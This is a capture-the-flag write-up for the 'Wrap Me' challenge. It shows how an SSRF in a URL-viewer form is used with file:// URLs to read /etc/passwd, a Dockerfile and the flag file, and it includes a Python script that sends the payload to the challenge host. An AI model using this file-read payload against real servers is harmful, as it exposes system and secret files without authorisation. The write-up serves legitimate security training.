# Wrap Me

## Description
```
The features of this parser are amazing. 
http and https protocols work great, but there is something else
```

## Writeup

Taking a look at the website. <br/>
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>URL Viewer</title>
    <link rel="stylesheet" href="styles.css">
</head>

<body>
    <div class="container">

        <div class="form-container">
            <form method="POST">
                <label for="url" class="form-label">URL:</label>
                <input type="text" id="url" name="url" class="form-input" required>
                <input type="submit" value="Отправить" class="form-submit">
            </form>
        </div>
    </div>
</body>

</html>
```

It seemed as if this was a website to look up other websites. <br/>
Knowing this I knew that it was probably a `SSRF` vulnerability. <br/>
Testing out simple `SSRF` with `file://` because the description states that maybe some other protocol works. <br/>
Using `file:///etc/passwd` I was able to read `passwd`. <br/>
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

I made a small python script to execute the SSRF and display it. <br/>
```py
import requests
from urllib.parse import urlencode
from bs4 import BeautifulSoup

# baseURL
url = 'http://45.88.77.177:21004/'

# absolute file path
path = '/etc/passwd'

# Payload
data = {"url": f"file://{path}"}

# URL encode data
encoded_data = urlencode(data)

# Send request
req = requests.post(url, data=encoded_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, verify=False)

# Get answer from response
soup = BeautifulSoup(req.text, 'html.parser')
result_container = soup.find('div', class_='result-container')

try:
    print(result_container.text)
except:
    print('No Result')
```

After a small directory scan I found `Dockerfile` and `flag`. <br/>
Now using my script with the default webroot path `/var/www/html` I was able to read `Dockerfile`. <br/>
```docker
FROM php:8.1.17-apache

WORKDIR /var/www/html

COPY . .

RUN chown -R www-data:www-data /var/www/html

COPY flag/ports.conf /etc/apache2

EXPOSE 21004

CMD ["apache2-foreground"]
```

Now I suppose this doesn't tell us much other than `flag` I found with the directory scan is actually a directory. <br/>
Knowing that, instead of searching for other files I tried to enumerate the flag with the format `flag.txt`. <br/>
Doing that I was able to enumerate the flag using the path `/var/www/html/flag/flag.txt` which concludes the writeup. <br/>
```sh
kali@kali python3 solve.py

grodno{PHp_Wr4pP3R_F1l3}
```
